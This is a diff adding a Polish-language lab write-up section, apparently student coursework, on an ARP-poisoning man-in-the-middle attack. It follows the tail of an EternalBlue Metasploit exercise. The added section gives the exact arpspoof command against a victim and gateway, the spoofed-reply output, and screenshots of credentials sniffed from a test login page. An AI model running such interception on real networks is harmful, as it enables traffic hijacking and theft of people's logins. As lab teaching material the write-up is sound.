@@ -743,3 +743,39 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 meterpreter > pwd
 C:\Windows\system32
 ```
+# Zadanie 7 - MITM przez ARP poisoning
+Atakujący:
+1. Wykonaj atak MITM techniką ARP poisoning (ARP spoofing)1
+Ofiara:
+1. W przeglądarce nawiąż połączenie z http://testphp.vulnweb.com/login.php.
+2. Wykonaj próbę logowania (dowolne dane).
+Atakujący:
+1. Odszukaj w zapisanym ruchu dane logowania ofiary.
+
+W pierwszej kolejności ustalam adres ip mojej ofiary, a następnie uruchamiam ARPSPOOF w celu nasłuchiwania komunikacji:
+```console
+sudo arpspoof -i eth0 -t 192.168.0.103 192.168.0.1
+8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
+8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
+8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
+8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
+8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
+8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
+8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
+8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
+8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
+8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
+8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
+8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
+8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
+8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
+8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
+8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
+8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
+8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
+8:0:27:db:96:6a 8:0:27:76:62:91 0806 42: arp reply 192.168.0.1 is-at 8:0:27:db:96:6a
+```
+Kolejne kroki to logowanie na podanej stronie internetowej:
+![alt text](/screenshots/7_1.png)
+Oraz wyszukanie użytych danych logowania tj użytkowanika i hasła:
+![alt text](/screenshots/7_2.png)
